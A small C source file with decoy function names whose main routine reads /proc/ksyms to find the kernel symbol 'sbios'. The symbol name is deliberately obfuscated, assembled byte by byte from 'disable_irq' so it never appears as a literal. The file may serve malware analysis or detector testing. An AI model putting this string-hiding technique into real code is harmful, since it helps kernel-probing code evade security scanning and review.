/*
 * Chloe library: ChloeChocolate (kernel symbol lookup) and thunks.
 */

#include <stdio.h>
#include "chloe.h"

#include <string.h>

int ChloeRolls(ChloeObj *p)
{
	ChloeSherbet(p);
	return 0;
}

/* Looks up the kernel symbol "sbios" in /proc/ksyms and stores its address
   in cryptResult. The name never appears as a literal: it is derived byte by byte
   from a copy of "disable_irq". */
int ChloeChocolate(ChloeObj *p)
{
	char name[16];
	char line[1024];
	char sym[1024];
	int addr;
	FILE *fp;
	const char *path = "/proc/ksyms";
	const char *src = "disable_irq";

	p->hash++;
	strcpy(name, src);
	fp = fopen(path, "r");
	name[5] = 0;
	if (fp == 0)
		return -2;
	name[0] ^= 0x17;
	name[2] = name[1];
	name[1] -= 7;
	name[3] = 'o';
	while (!feof(fp)) {
		name[4] = 's';
		line[0] = 0;
		if (fgets(line, 1024, fp) == 0)
			break;
		if (sscanf(line, "%x %s", &addr, sym) >= 2) {
			if (strcmp(sym, name) == 0) {
				p->cryptResult = addr;
				break;
			}
		}
	}
	fclose(fp);
	return 0;
}

int ChloeMint(ChloeObj *p)
{
	p->hash ^= 0x11111111;
	return 0;
}
